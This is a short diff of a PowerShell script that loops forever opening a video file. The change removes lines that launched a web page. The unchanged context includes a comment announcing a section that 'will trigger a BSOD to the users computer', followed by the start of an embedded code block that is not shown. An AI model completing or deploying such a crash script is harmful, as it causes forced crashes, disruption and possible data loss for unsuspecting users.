@@ -34,9 +34,6 @@ while ($true) {
         Invoke-Item $output
         # Wait for the video to finish
         Start-Sleep -Seconds 10  # Adjust this to the length of your video
-        # Open a webpage
-        $webpage = "http://example.com"
-        Start-Process $webpage
 
 # This section will trigger a BSOD to the users computer
 $source = @"
